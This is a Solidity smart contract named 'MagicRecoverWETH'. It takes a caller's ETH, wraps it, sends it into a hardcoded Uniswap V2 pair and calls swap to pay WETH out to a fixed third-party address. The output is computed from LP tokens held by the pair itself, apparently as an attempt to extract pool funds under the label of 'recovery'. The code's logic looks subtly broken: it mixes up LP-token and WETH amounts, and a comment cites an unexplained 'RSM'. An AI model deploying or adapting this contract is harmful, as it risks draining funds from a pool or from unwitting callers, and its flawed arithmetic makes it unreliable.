// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    function swap(uint, uint, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract MagicRecoverWETH {
    address constant PAIR = 0x8E1252372A48fa3Ad8de5B5592E91D452B440D16;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Send slightly more than 4 ETH when calling this
    function recover() external payable {
        IWETH weth = IWETH(WETH);
        IUniswapV2Pair pair = IUniswapV2Pair(PAIR);

        // Wrap ETH → WETH
        weth.deposit{ value: msg.value }();

        // Calculate exact output
        (, uint112 reserve1,) = pair.getReserves();
        uint256 totalSupply   = pair.totalSupply();
        uint256 lpAtPair      = pair.balanceOf(PAIR);
        uint256 wethOut       = uint256(lpAtPair) * uint256(reserve1) / totalSupply;

        // Send WETH input to pair
        weth.transfer(PAIR, msg.value);

        // Swap: token0Out=0 (skip RSM entirely), token1Out=WETH
        pair.swap(0, wethOut, 0xaB257731181f39cE624B4184A3Fd352abfD1549B, "");

        // Refund any leftover WETH
        uint256 leftover = weth.balanceOf(address(this));
        if (leftover > 0) weth.transfer(0xaB257731181f39cE624B4184A3Fd352abfD1549B, leftover);
    }
}
